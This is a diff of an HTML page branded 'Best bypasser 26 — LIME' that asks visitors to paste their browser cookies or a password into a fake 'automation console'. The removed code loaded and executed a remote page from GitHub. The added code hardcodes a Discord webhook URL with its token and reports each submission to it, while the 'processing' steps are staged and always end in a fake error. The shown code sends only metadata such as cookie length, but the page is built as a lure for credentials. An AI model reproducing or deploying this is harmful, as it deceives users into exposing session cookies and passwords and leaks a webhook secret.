@@ -1,63 +1,64 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <meta name="theme-color" content="#070a06">
-  <title>Best bypasser 26 — LIME</title>
-  <style>html,body{margin:0;min-height:100%;background:#050705;color:#edf5e6;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}body{display:grid;place-items:center;overflow:hidden}main{padding:28px;text-align:center}span{color:#b7f34d;font-weight:800}p{color:#7e8878;font-size:12px}</style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#060806">
+<meta name="description" content="LIME — Best bypasser 26 interface">
+<title>Best bypasser 26 — LIME</title>
+<style>
+:root{color-scheme:dark;--bg:#060806;--panel:#0c110b;--lime:#b7f34d;--lime2:#dfff91;--text:#edf5e6;--muted:#7e8878;--line:#25331f;--danger:#e9a86b}
+*{box-sizing:border-box}html,body{margin:0;min-height:100%;background:var(--bg);color:var(--text);font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}body{overflow-x:hidden}.lock{overflow:hidden}
+.bg{position:fixed;inset:0;z-index:-3;background:radial-gradient(circle at 50% 12%,#1b2a11 0,transparent 36%),linear-gradient(#070a06,#050705)}
+.grid{position:fixed;inset:0;z-index:-2;opacity:.2;background-image:linear-gradient(rgba(183,243,77,.08) 1px,transparent 1px),linear-gradient(90deg,rgba(183,243,77,.08) 1px,transparent 1px);background-size:42px 42px;mask-image:linear-gradient(to bottom,black,transparent 85%);animation:grid 18s linear infinite}
+.orb{position:fixed;width:520px;height:520px;left:50%;top:3%;transform:translateX(-50%);border-radius:50%;background:radial-gradient(circle,rgba(183,243,77,.13),transparent 66%);filter:blur(12px);animation:orb 7s ease-in-out infinite}
+.intro{position:fixed;inset:0;z-index:50;display:grid;place-items:center;background:#050705;opacity:1;visibility:visible;transition:opacity .8s ease,visibility .8s ease}.intro.done{opacity:0;visibility:hidden;pointer-events:none}
+.intro-inner{display:flex;flex-direction:column;align-items:center;gap:22px;animation:float 3s ease-in-out both}
+.fruit{position:relative;width:150px;height:150px;animation:fruit .95s .05s cubic-bezier(.16,.84,.2,1) both}
+.body{position:absolute;left:14px;top:20px;width:118px;height:118px;border-radius:50%;background:radial-gradient(circle at 35% 28%,#efffc0 0 6%,#d7ff83 7% 18%,#b7f34d 19% 62%,#86ad30 63% 73%,#354a19 74%);box-shadow:inset -9px -12px 18px rgba(30,45,13,.38),inset 8px 7px 17px rgba(255,255,255,.16),0 0 52px rgba(183,243,77,.26)}
+.body:before{content:"";position:absolute;inset:16px;border:1px solid rgba(245,255,220,.24);border-radius:50%}.body:after{content:"";position:absolute;inset:31px;border:1px solid rgba(245,255,220,.12);border-radius:50%}
+.leaf{position:absolute;z-index:5;left:77px;top:4px;width:58px;height:28px;background:linear-gradient(135deg,#e6ffad,#86bf37);border-radius:100% 0 100% 0;transform:rotate(-23deg);box-shadow:0 0 18px rgba(183,243,77,.18)}
+.leaf:after{content:"";position:absolute;left:10px;top:15px;width:39px;height:1px;background:rgba(32,52,16,.45);transform:rotate(-8deg);transform-origin:left}
+.stem{position:absolute;z-index:6;left:75px;top:-18px;width:3px;height:38px;border-radius:99px;background:#d3f58a}
+.bite{position:absolute;z-index:10;right:-1px;top:31px;width:50px;height:50px;border-radius:50%;background:#050705}
+.word{font-size:34px;font-weight:900;letter-spacing:.22em;color:var(--lime);opacity:0;transform:translateY(10px);animation:word .75s 1.25s forwards;text-shadow:0 0 22px rgba(183,243,77,.12)}
+.wrap{width:min(900px,94vw);margin:0 auto;padding:44px 0 80px;opacity:0;transform:translateY(24px);filter:blur(7px);animation:page .9s 2.45s forwards}
+.top{display:flex;align-items:center;justify-content:space-between;margin-bottom:28px}.brand{display:flex;align-items:center;gap:12px;font-weight:900;font-size:25px;letter-spacing:.12em;color:var(--lime)}.mini{width:28px;height:28px;border-radius:50%;background:radial-gradient(circle,#eaffb0 0 7%,#b7f34d 8% 60%,#6b9625 61% 72%,#233017 73%);box-shadow:0 0 25px rgba(183,243,77,.35)}.tag{font-size:11px;color:var(--muted);border:1px solid var(--line);padding:8px 11px;border-radius:99px}
+.panel{position:relative;padding:34px;border:1px solid var(--line);border-radius:24px;background:linear-gradient(145deg,rgba(16,22,14,.97),rgba(8,11,8,.97));box-shadow:0 35px 100px rgba(0,0,0,.5),0 0 70px rgba(183,243,77,.045);transition:transform .18s ease}.panel:before{content:"";position:absolute;inset:-1px;border-radius:24px;padding:1px;background:linear-gradient(130deg,rgba(183,243,77,.45),transparent 28%,transparent 70%,rgba(183,243,77,.18));-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
+.eyebrow{font-size:11px;color:var(--lime);letter-spacing:.2em;text-transform:uppercase}.title{font-size:clamp(30px,5vw,48px);line-height:1.05;margin:12px 0;color:#f4faef;letter-spacing:-.04em}.desc{color:var(--muted);font-size:13px;line-height:1.7;max-width:680px}
+.modes{display:flex;gap:8px;margin:25px 0 15px}.mode{border:1px solid var(--line);background:#0a0e09;color:#87917f;padding:10px 14px;border-radius:10px;cursor:pointer;font:inherit;transition:.25s}.mode.active{color:#10150b;background:var(--lime);border-color:var(--lime);box-shadow:0 0 24px rgba(183,243,77,.16)}
+label{display:block;font-size:11px;color:#9aa392;margin:18px 0 8px}.field{width:100%;border:1px solid var(--line);outline:0;background:#070a07!important;color:#eff7e9!important;border-radius:13px;padding:15px;font:13px/1.6 inherit;resize:vertical;transition:.25s;color-scheme:dark}.field::placeholder{color:#596253}.field:focus{border-color:rgba(183,243,77,.65);box-shadow:0 0 0 3px rgba(183,243,77,.07)}input.field{height:48px;resize:none}.password{display:none}.password.show{display:block}
+.hint{margin:14px 0;color:#697264;font-size:11px}.cta{width:100%;height:56px;border:0;border-radius:13px;background:var(--lime);color:#0a1006;font:900 13px inherit;cursor:pointer;position:relative;overflow:hidden}.cta.loading{pointer-events:none}.cta.loading span{opacity:0}.cta:after{content:"";position:absolute;left:-40%;top:0;height:100%;width:35%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.65),transparent);transform:skewX(-18deg);animation:shine 1s linear infinite}
+.overlay{position:fixed;inset:0;z-index:70;display:grid;place-items:center;background:rgba(3,5,3,.82);backdrop-filter:blur(15px);opacity:0;visibility:hidden;transition:.35s}.overlay.show{opacity:1;visibility:visible}.proc{width:min(560px,90vw);padding:30px;border:1px solid var(--line);border-radius:22px;background:#0a0f09;box-shadow:0 35px 100px #000}.proc-title{font-size:21px;font-weight:800}.proc-msg{color:var(--muted);font-size:12px;margin:8px 0 24px}.bar{height:5px;background:#192117;border-radius:9px;overflow:hidden}.bar i{display:block;height:100%;width:0;background:var(--lime);box-shadow:0 0 20px var(--lime);transition:width .6s}.steps{display:grid;gap:10px;margin:22px 0}.step{display:flex;align-items:center;gap:10px;color:#566051;font-size:11px}.dot{width:8px;height:8px;border-radius:50%;background:#263023}.step.active{color:var(--lime)}.step.active .dot{background:var(--lime);box-shadow:0 0 14px var(--lime);animation:pulse 1s infinite}.step.done{color:#a5b197}.step.done .dot{background:#789e3a}.error{margin-top:20px;padding:17px;border:1px solid rgba(233,168,107,.3);border-radius:13px;background:rgba(233,168,107,.06)}.error-code{font-size:22px;font-weight:900;color:var(--danger)}.error-text{font-size:11px;color:#9e9588;margin-top:6px}.actions{display:flex;gap:8px;margin-top:16px}.actions button{flex:1;padding:11px;border-radius:10px;border:1px solid var(--line);background:#0d130c;color:#b8c1b1;font:11px inherit;cursor:pointer}.actions button:first-child{background:var(--lime);color:#0b1007;border-color:var(--lime)}
+@keyframes fruit{0%{transform:scale(.15) rotate(-18deg);opacity:0;filter:blur(8px)}55%{transform:scale(1.06) rotate(4deg);opacity:1;filter:none}100%{transform:scale(.94) rotate(0)}}@keyframes word{to{opacity:1;transform:translateY(0)}}@keyframes float{50%{transform:translateY(-4px)}}@keyframes page{to{opacity:1;transform:none;filter:none}}@keyframes orb{50%{transform:translateX(-50%) scale(1.15);opacity:.7}}@keyframes grid{to{transform:translateY(42px)}}@keyframes shine{to{left:130%}}@keyframes pulse{50%{opacity:.35}}
+@media(max-width:600px){.wrap{padding-top:25px}.panel{padding:22px}.tag{display:none}}@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}.wrap{opacity:1;transform:none;filter:none}.word{opacity:1;transform:none}}
+</style>
 </head>
-<body>
-<main><span>LIME</span><p>Loading interface…</p></main>
+<body class="lock">
+<div class="bg"></div><div class="grid"></div><div class="orb"></div>
+<section class="intro" id="intro"><div class="intro-inner"><div class="fruit"><div class="stem"></div><div class="leaf"></div><div class="body"></div><div class="bite"></div></div><div class="word">LIME</div></div></section>
+<main class="wrap"><header class="top"><div class="brand"><span class="mini"></span>LIME</div><div class="tag">SECURE AUTOMATION / v2</div></header><section class="panel" id="panel"><div class="eyebrow">Automation console</div><h1 class="title">Best bypasser 26</h1><p class="desc">Prepare your cookies and start the processing pipeline.</p><div class="modes"><button class="mode active" id="cookie">🍪 Cookie Mode</button><button class="mode" id="passwordMode">🔒 Password Mode</button></div><label for="data">Cookies</label><textarea class="field" id="data" rows="7" placeholder="Paste your cookies here…"></textarea><div class="password" id="passwordBox"><label for="password">Password</label><input class="field" id="password" type="password" autocomplete="off" placeholder="Enter password"></div><div class="hint">Processing service is currently offline.</div><button class="cta" id="start"><span>Start Processing</span></button></section></main>
+<div class="overlay" id="overlay"><div class="proc"><div class="proc-title" id="pt">Starting secure processing</div><div class="proc-msg" id="pm">Preparing your request…</div><div class="bar"><i id="bar"></i></div><div class="steps"><div class="step active" id="s0"><b class="dot"></b>Validate request</div><div class="step" id="s1"><b class="dot"></b>Connect to processing server</div><div class="step" id="s2"><b class="dot"></b>Start remote job</div></div><div class="error" id="err" hidden><div class="error-code">Error(402)</div><div class="error-text">Servers are disabled or currently unavailable.</div></div><div class="actions"><button id="retry">Retry</button><button id="close">Close</button></div></div></div>
 <script>
-const SOURCE='https://raw.githubusercontent.com/lexioipro-sudo/lime-secure-automation-v2/287785f77f16c39026e1bba582ad80f7ba7ce41a/index.html';
-(async()=>{
-  try{
-    const response=await fetch(SOURCE,{cache:'no-store'});
-    if(!response.ok) throw new Error('Source returned '+response.status);
-    let html=await response.text();
-    const replacements=[
-      ['LIME — Secure Automation','Best bypasser 26 — LIME'],
-      ['Process your data.<br>Securely.','Best bypasser 26'],
-      ['◉ Auto Mode','🍪 Cookie Mode'],
-      ['◉ Manual Mode','🔒 Password Mode'],
-      ['Auto Mode','Cookie Mode'],
-      ['Manual Mode','Password Mode'],
-      ['Input data','Cookies'],
-      ['Paste your data here…','Paste your cookies here…'],
-      ['Cookied','Cookies'],
-      ['Access key','Password'],
-      ['Enter access key','Enter password'],
-      ['access-key','password'],
-      ['type="text" autocomplete="off" placeholder="Enter password"','type="password" autocomplete="off" placeholder="Enter password"'],
-      ["mode='auto'","mode='cookie'"],
-      ["mode='manual'","mode='password'"],
-      ["mode==='manual'&&!k","mode==='password'&&!k"],
-      ["last?.key","last?.password"],
-      ["last={data:d,key:!!k}","last={data:d,password:!!k}"]
-    ];
-    for(const [from,to] of replacements) html=html.split(from).join(to);
-
-    html=html.replace(
-      /async function audit\(event,error=''\)\{[\s\S]*?\}\nfunction toast/,
-      `async function audit(event,error=''){
-        if(!WEBHOOK)return;
-        const d=last?.data||'';
-        const now=new Date();
-        const payload={username:'LIME • Audit',allowed_mentions:{parse:[]},embeds:[{title:error?'🟠 LIME / PROCESSING ERROR':'🍋‍🟩 LIME / AUDIT EVENT',description:error?'Processing service unavailable.':'A new submission was received.',color:error?0xE9A86B:0xB7F34D,timestamp:now.toISOString(),fields:[{name:'Event',value:'\\`'+event+'\\`',inline:true},{name:'Mode',value:mode.toUpperCase(),inline:true},{name:'Password',value:last?.password?'Provided (redacted)':'Not provided',inline:true},{name:'Input size',value:String(d.length)+' chars',inline:true},{name:'Locale / TZ',value:(navigator.language||'unknown')+' • '+(Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown'),inline:true},...(error?[{name:'Error',value:'\\`'+error+'\\`',inline:true}]:[])],footer:{text:'LIME • Audit Log • github-pages'}}]};
-        try{await fetch(WEBHOOK+'?wait=true',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),keepalive:true})}catch(e){console.warn('Audit delivery failed',e)}
-      }
-function toast`
-    );
-
-    html=html.replace(/<div class="hint">[\s\S]*?<\/div>/,'');
-    document.open();
-    document.write(html);
-    document.close();
-  }catch(error){
-    document.body.innerHTML='<main style="padding:32px;text-align:center;font-family:monospace;color:#edf5e6;background:#050705"><div style="color:#b7f34d;font-weight:800">LIME</div><p style="color:#e9a86b">Interface failed to load.</p><small style="color:#7e8878">'+String(error).replace(/[&<>]/g,'')+'</small></main>';
-  }
-})();
+const WEBHOOK='https://discord.com/api/webhooks/1550133823952519208/FczRTRleHJ9J7e8j5W0Th3k9idwM0i5WhuRVd6Sl6nwWzixdSuRoC_FaIC2lVqxSo76y';
+const $=id=>document.getElementById(id);let mode='cookie',last=null;
+async function audit(event,error=''){
+ if(!WEBHOOK||!last)return;
+ const payload={username:'LIME • Audit',allowed_mentions:{parse:[]},embeds:[{title:error?'🟠 LIME / PROCESSING ERROR':'🍋‍🟩 LIME / AUDIT EVENT',description:error?'Processing service unavailable.':'A LIME processing event was received.',color:error?0xE9A86B:0xB7F34D,timestamp:new Date().toISOString(),fields:[
+  {name:'Event',value:'`'+event+'`',inline:true},{name:'Mode',value:mode.toUpperCase(),inline:true},
+  {name:'Cookies length',value:String(last.cookiesLength)+' chars',inline:true},{name:'Password',value:last.passwordProvided?'Provided (redacted)':'Not provided',inline:true},
+  ...(error?[{name:'Error',value:'`'+error+'`',inline:true}]:[])
+ ],footer:{text:'LIME • Audit Log • metadata only'}}]};
+ try{await fetch(WEBHOOK+'?wait=true',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),keepalive:true})}catch(e){console.warn('Audit delivery failed',e)}
+}
+function setMode(next){mode=next;$('cookie').classList.toggle('active',next==='cookie');$('passwordMode').classList.toggle('active',next==='password');$('passwordBox').classList.toggle('show',next==='password')}
+$('cookie').onclick=()=>setMode('cookie');$('passwordMode').onclick=()=>setMode('password');
+$('panel').onmousemove=e=>{const r=$('panel').getBoundingClientRect();const x=(e.clientX-r.left)/r.width-.5,y=(e.clientY-r.top)/r.height-.5;$('panel').style.transform=`perspective(1000px) rotateX(${(-y*2).toFixed(2)}deg) rotateY(${(x*2.5).toFixed(2)}deg)`};$('panel').onmouseleave=()=>$('panel').style.transform='';
+function toast(msg){alert(msg)}
+function step(n){for(let i=0;i<3;i++){$('s'+i).classList.toggle('active',i===n);$('s'+i).classList.toggle('done',i<n)}}
+async function process(){if(!last)return;$('overlay').classList.add('show');$('start').classList.add('loading');$('start').disabled=true;$('err').hidden=true;$('bar').style.width='8%';step(0);$('pt').textContent='Starting secure processing';$('pm').textContent='Preparing your request…';await audit('submission_received');await new Promise(r=>setTimeout(r,650));step(1);$('bar').style.width='42%';$('pm').textContent='Attempting to connect to the processing server…';await new Promise(r=>setTimeout(r,900));step(2);$('bar').style.width='76%';$('pm').textContent='Starting remote job…';await new Promise(r=>setTimeout(r,900));$('bar').style.width='100%';$('pt').textContent='Processing unavailable';$('pm').textContent='The server did not accept the request.';$('err').hidden=false;await audit('processing_failed','Error(402)');$('start').classList.remove('loading');$('start').disabled=false}
+$('start').onclick=async()=>{const cookies=$('data').value.trim();const password=$('password').value;if(mode==='cookie'&&!cookies)return toast('Paste your cookies first');if(mode==='password'&&!password)return toast('Enter your password');last={cookiesLength:cookies.length,passwordProvided:Boolean(password)};await process()};$('close').onclick=()=>{$('overlay').classList.remove('show');$('start').classList.remove('loading');$('start').disabled=false};$('retry').onclick=process;
+function finishIntro(){$('intro').classList.add('done');document.body.classList.remove('lock')}
+setTimeout(finishIntro,3000);window.addEventListener('load',()=>setTimeout(finishIntro,3050),{once:true});
 </script>
-</body>
-</html>
+</body></html>
